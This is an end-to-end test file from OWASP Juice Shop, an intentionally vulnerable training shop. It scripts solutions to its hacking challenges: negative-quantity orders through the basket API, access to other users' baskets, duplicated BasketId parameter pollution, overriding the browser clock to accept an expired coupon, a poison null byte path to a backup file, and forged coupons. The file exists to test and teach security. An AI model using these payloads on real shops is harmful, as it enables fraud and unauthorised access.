/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
import { $, $$, browser, by, element, protractor } from 'protractor'
import { basePath, beforeEachLogin, expectChallengeSolved } from './e2eHelpers'

const security = require('../../lib/insecurity')

describe('/#/basket', () => {
  describe('as admin', () => {
    beforeEachLogin({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

    describe('challenge "negativeOrder"', () => {
      it('should be possible to update a basket to a negative quantity via the Rest API', () => {
        void browser.waitForAngularEnabled(false)
        browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); }}; xhttp.open("PUT","${browser.baseUrl}/api/BasketItems/1", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",\`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"quantity": -100000}));`) // eslint-disable-line
        void browser.driver.sleep(1000)
        void browser.waitForAngularEnabled(true)

        void browser.get(`${basePath}/#/order-summary`)

        const productQuantities = $$('mat-cell.mat-column-quantity > span')
        expect(productQuantities.first().getText()).toMatch(/-100000/)
      })

      it('should be possible to place an order with a negative total amount', () => {
        void element(by.id('checkoutButton')).click()
      })

      expectChallengeSolved({ challenge: 'Payback Time' })
    })

    describe('challenge "basketAccessChallenge"', () => {
      it('should access basket with id from session storage instead of the one associated to logged-in user', () => {
        void browser.executeScript('window.sessionStorage.bid = 3;')

        void browser.get(`${basePath}/#/basket`)

        // TODO Verify functionally that it's not the basket of the admin
      })

      expectChallengeSolved({ challenge: 'View Basket' })
    })

    describe('challenge "basketManipulateChallenge"', () => {
      it('should manipulate basket of other user instead of the one associated to logged-in user', () => {
        void browser.waitForAngularEnabled(false)
        void browser.executeScript((baseUrl: string) => {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }

          xhttp.open('POST', `${baseUrl}/api/BasketItems/`)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.send('{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }') //eslint-disable-line
        }, browser.baseUrl)
        void browser.driver.sleep(1000)
        void browser.waitForAngularEnabled(true)
      })

      expectChallengeSolved({ challenge: 'Manipulate Basket' })
    })
  })

  describe('as jim', () => {
    beforeEachLogin({ email: `jim@${config.get('application.domain')}`, password: 'ncc-1701' })
    describe('challenge "manipulateClock"', () => {
      it('should be possible to enter WMNSDY2019 coupon', () => {
        void browser.waitForAngularEnabled(false)
        void browser.executeScript('window.localStorage.couponPanelExpanded = false;')
        void browser.driver.sleep(2000)
        void browser.waitForAngularEnabled(true)

        void browser.get(`${basePath}/#/payment/shop`)

        void browser.waitForAngularEnabled(false)
        void browser.executeScript('event = new Date("March 08, 2019 00:00:00"); Date = function(Date){return function() {date = event; return date; }}(Date);')
        void browser.driver.sleep(2000)
        void browser.waitForAngularEnabled(true)

        void element(by.id('collapseCouponElement')).click()
        void browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.') // eslint-disable-line no-undef

        void element(by.id('coupon')).sendKeys('WMNSDY2019')
        void element(by.id('applyCouponButton')).click()
      })

      it('should be possible to place an order with the expired coupon', () => {
        void browser.get(`${basePath}/#/order-summary`)
        void element(by.id('checkoutButton')).click()
      })

      expectChallengeSolved({ challenge: 'Expired Coupon' })
    })

    describe('challenge "forgedCoupon"', () => {
      it('should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack', () => {
        void browser.driver.get(`${browser.baseUrl}/ftp/coupons_2013.md.bak%2500.md`)
      })

      it('should be possible to add a product in the basket', () => {
        void browser.waitForAngularEnabled(false)
        void browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () { if (this.status === 201) { console.log("Success") } } ; xhttp.open("POST", "${browser.baseUrl}/api/BasketItems/", true); xhttp.setRequestHeader("Content-type", "application/json"); xhttp.setRequestHeader("Authorization", \`Bearer $\{localStorage.getItem("token")}\`); xhttp.send(JSON.stringify({"BasketId": \`$\{sessionStorage.getItem("bid")}\`, "ProductId":1, "quantity": 1}))`) // eslint-disable-line
        void browser.driver.sleep(1000)
        void browser.waitForAngularEnabled(true)
      })

      it('should be possible to enter a coupon that gives an 80% discount', () => {
        void browser.executeScript('window.localStorage.couponPanelExpanded = false;')

        void browser.get(`${basePath}/#/payment/shop`)
        void browser.driver.sleep(1000)
        void element(by.id('collapseCouponElement')).click()
        void browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.') // eslint-disable-line no-undef
        void browser.driver.sleep(1000)
        void element(by.id('coupon')).sendKeys(security.generateCoupon(90))
        void browser.driver.sleep(1000)
        void element(by.id('applyCouponButton')).click()
      })

      it('should be possible to place an order with a forged coupon', () => {
        void browser.get(`${basePath}/#/order-summary`)
        void element(by.id('checkoutButton')).click()
      })

      expectChallengeSolved({ challenge: 'Forged Coupon' })
    })
  })
})
